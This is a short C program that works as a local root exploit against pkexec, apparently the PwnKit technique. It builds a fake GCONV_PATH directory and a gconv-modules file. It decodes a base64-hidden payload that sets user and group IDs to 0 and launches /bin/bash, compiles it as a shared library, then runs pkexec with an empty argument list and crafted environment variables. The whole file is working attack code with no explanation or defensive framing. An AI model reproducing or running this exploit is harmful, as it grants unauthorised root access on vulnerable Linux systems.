#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int *argc, char *argv[]){
	system("mkdir GCONV_PATH=.; touch 'GCONV_PATH=./secquest' && chmod +x 'GCONV_PATH=./secquest'");
	system("mkdir secquest && echo 'I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKdm9pZCBnY29udigpe307Cgp2b2lkIGdjb252X2luaXQoKXsKCXNldHVpZCgwKTsKCXNldGdpZCgwKTsKCXNldGV1aWQoMCk7CglzZXRlZ2lkKDApOwoJc3lzdGVtKCJleHBvcnQgUEFUSD0vdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi9iaW46L3NiaW47L2Jpbi9iYXNoIik7CglleGl0KDApOwp9Cg==' | base64 -d > secquest/secquest.c; gcc secquest/secquest.c -o secquest/secquest.so -shared -fPIC");
	system("echo 'module UTF-8// SECQUEST// secquest 2' > secquest/gconv-modules");
	execve("/usr/bin/pkexec", (char*[]){NULL}, (char*[]){"secquest","PATH=GCONV_PATH=.","CHARSET=SECQUEST","SHELL=/fake/shell",NULL});
}
